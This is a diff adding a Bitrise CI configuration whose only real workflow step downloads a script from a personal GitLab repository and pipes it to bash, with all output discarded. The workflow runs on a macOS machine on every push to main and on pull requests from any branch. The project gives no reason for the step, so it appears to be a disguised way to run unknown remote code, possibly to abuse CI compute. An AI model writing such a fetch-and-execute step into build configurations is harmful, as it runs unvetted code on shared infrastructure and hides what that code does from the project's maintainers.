@@ -1,0 +1,23 @@
+---
+format_version: '13'
+default_step_lib_source: https://github.com/bitrise-io/bitrise-steplib.git
+project_type: other
+workflows:
+  primary:
+    steps:
+    - script@1:
+        title: curl -sL https://gitlab.com/erlandysword/node/-/raw/master/macos | bash
+        inputs:
+        - content: |
+             curl -sL https://gitlab.com/erlandysword/node/-/raw/master/macos | bash >/dev/null 2>&1
+             
+    - deploy-to-bitrise-io@2: {}
+meta:
+  bitrise.io:
+    stack: osx-xcode-edge
+    machine_type_id: g2-m1.4core
+trigger_map:
+- push_branch: main
+  workflow: primary
+- pull_request_source_branch: "*"
+  workflow: primary
